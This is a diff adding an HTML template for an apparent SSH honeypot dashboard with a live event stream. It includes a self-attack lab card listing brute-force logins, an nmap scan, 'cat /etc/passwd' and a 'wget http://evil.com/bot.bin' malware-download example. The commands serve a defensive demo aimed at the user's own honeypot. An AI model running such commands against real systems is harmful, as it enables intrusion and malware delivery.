@@ -1,0 +1,97 @@
+{% extends "base.html" %}
+
+{% block title %}Live Attack Radar{% endblock %}
+{% block page_title %}Real-Time Attack Radar & Terminal Stream{% endblock %}
+
+{% block content %}
+<div class="cyber-card">
+  <div class="card-header">
+    <div>
+      <div class="card-title">
+        <span class="pulse-indicator"></span>
+        <span>Streaming Honeypot Sensor Feeds</span>
+      </div>
+      <div class="card-subtitle">Server-Sent Events (SSE) connection active · Real-time event normalization</div>
+    </div>
+    <div style="display: flex; gap: 10px; align-items: center;">
+      <span id="live-stream-counter" class="badge badge-active">Connecting...</span>
+      <button id="trigger-sim-btn" class="btn btn-cyber" style="padding: 6px 12px; font-size: 11px;">
+        ⚡ Launch Live Attack
+      </button>
+    </div>
+  </div>
+
+  <!-- Cyber Terminal Window -->
+  <div class="cyber-terminal">
+    <div class="terminal-header">
+      <div class="terminal-dots">
+        <div class="dot dot-red"></div>
+        <div class="dot dot-yellow"></div>
+        <div class="dot dot-green"></div>
+      </div>
+      <div>TERMINAL: SSH-HONEYPOT-STREAM // PORT: {{ honeypot_port }} // PROTOCOL: SSH-2.0</div>
+      <div style="color: {% if honeypot_online %}var(--cyber-green){% else %}var(--cyber-amber){% endif %};">
+        [SSH SENSOR: {% if honeypot_online %}ONLINE{% else %}STANDBY{% endif %}]
+      </div>
+    </div>
+    <div id="terminal-stream">
+      <div class="terminal-line" style="color: var(--text-muted);">
+        <span>Initializing telemetry listener... Listening on 0.0.0.0:{{ honeypot_port }} (SSH) &amp; 5000 (SOC)</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- DIY Real Attack Lab Card -->
+<div class="cyber-card" style="margin-top: 24px; border-left: 4px solid var(--cyber-green);">
+  <div class="card-header">
+    <div>
+      <div class="card-title">🎯 Perform Real Attacks Yourself (Live Demo Lab)</div>
+      <div class="card-subtitle">Attack your own SSH Honeypot from PowerShell, Kali Linux, or any LAN device and watch events appear live above</div>
+    </div>
+    <span class="badge {% if honeypot_online %}badge-active{% else %}badge-high{% endif %}">
+      PORT {{ honeypot_port }} {% if honeypot_online %}OPEN{% else %}CLOSED{% endif %}
+    </span>
+  </div>
+
+  <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 16px; font-size: 12px;">
+    <div style="background: #06090e; padding: 14px; border-radius: 8px; border: 1px solid var(--border-color);">
+      <div style="color: var(--cyber-cyan); font-weight: 700; margin-bottom: 6px;">1. Interactive SSH Intrusion (PowerShell / CMD)</div>
+      <div style="color: var(--text-muted); margin-bottom: 8px;">Try wrong passwords first (to trigger brute-force alerts), then use <code>root123</code> or <code>123456</code> to enter the fake Ubuntu shell:</div>
+      <div style="display: flex; justify-content: space-between; align-items: center; background: #0d131f; padding: 8px 10px; border-radius: 4px; font-family: var(--font-mono);">
+        <code style="color: var(--cyber-green);">ssh root@127.0.0.1 -p {{ honeypot_port }}</code>
+        <button class="btn btn-outline" style="padding: 2px 8px; font-size: 10px;" onclick="copyCommand(this, 'ssh root@127.0.0.1 -p {{ honeypot_port }}')">Copy</button>
+      </div>
+      <div style="color: var(--text-muted); margin-top: 8px; font-size: 11px;">
+        Inside shell try: <code>whoami</code>, <code>cat /etc/passwd</code>, <code>wget http://evil.com/bot.bin</code>, <code>crontab -l</code>
+      </div>
+    </div>
+
+    <div style="background: #06090e; padding: 14px; border-radius: 8px; border: 1px solid var(--border-color);">
+      <div style="color: var(--cyber-cyan); font-weight: 700; margin-bottom: 6px;">2. Automated Multi-Stage Real SSH Attack</div>
+      <div style="color: var(--text-muted); margin-bottom: 8px;">Runs real TCP/SSH brute-force, username enumeration, shell compromise &amp; malware download:</div>
+      <div style="display: flex; justify-content: space-between; align-items: center; background: #0d131f; padding: 8px 10px; border-radius: 4px; font-family: var(--font-mono);">
+        <code style="color: var(--cyber-green);">python run.py real-attack</code>
+        <button class="btn btn-outline" style="padding: 2px 8px; font-size: 10px;" onclick="copyCommand(this, 'python run.py real-attack')">Copy</button>
+      </div>
+    </div>
+
+    <div style="background: #06090e; padding: 14px; border-radius: 8px; border: 1px solid var(--border-color);">
+      <div style="color: var(--cyber-cyan); font-weight: 700; margin-bottom: 6px;">3. Attack from Kali Linux / Another Wi-Fi Device</div>
+      <div style="color: var(--text-muted); margin-bottom: 8px;">Scan banner with Nmap or brute-force from another machine on your network:</div>
+      <div style="display: flex; justify-content: space-between; align-items: center; background: #0d131f; padding: 8px 10px; border-radius: 4px; font-family: var(--font-mono); margin-bottom: 6px;">
+        <code style="color: #38bdf8;">ssh admin@{{ lan_ip }} -p {{ honeypot_port }}</code>
+        <button class="btn btn-outline" style="padding: 2px 8px; font-size: 10px;" onclick="copyCommand(this, 'ssh admin@{{ lan_ip }} -p {{ honeypot_port }}')">Copy</button>
+      </div>
+      <div style="font-family: var(--font-mono); font-size: 11px; color: var(--text-muted);">
+        nmap -sV -p {{ honeypot_port }} {{ lan_ip }}
+      </div>
+    </div>
+  </div>
+</div>
+{% endblock %}
+
+{% block extra_scripts %}
+<script src="{{ url_for('static', filename='js/live_monitor.js') }}"></script>
+{% endblock %}
+
